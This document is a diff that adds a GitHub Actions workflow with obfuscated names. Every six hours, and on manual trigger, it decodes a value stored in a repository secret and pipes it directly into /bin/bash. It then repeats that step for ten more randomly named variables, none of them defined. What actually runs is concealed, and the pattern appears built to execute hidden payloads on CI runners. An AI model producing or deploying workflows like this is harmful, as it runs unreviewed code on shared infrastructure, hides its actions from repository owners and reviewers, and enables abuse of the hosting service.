@@ -1,0 +1,27 @@
+name: thenexplore
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: thenexplore
+        env:
+          xlzt706: ${{ secrets.xlzt706 }}
+        run: |
+          echo $xlzt706 | jq -r .gg7 | /bin/bash
+          echo $gpsg1666 | jq -r .jcv68 | /bin/bash
+          echo $i40 | jq -r .j2840 | /bin/bash
+          echo $eeqyv85039 | jq -r .ioys6 | /bin/bash
+          echo $e38102 | jq -r .nvfuu7 | /bin/bash
+          echo $hrjp9 | jq -r .ayi35 | /bin/bash
+          echo $f281 | jq -r .mqmo1200 | /bin/bash
+          echo $j62 | jq -r .jiu66613 | /bin/bash
+          echo $zk2886 | jq -r .qfb89 | /bin/bash
+          echo $a39 | jq -r .hsyrt4776 | /bin/bash
+          echo $efkf5409 | jq -r .ad00 | /bin/bash
+
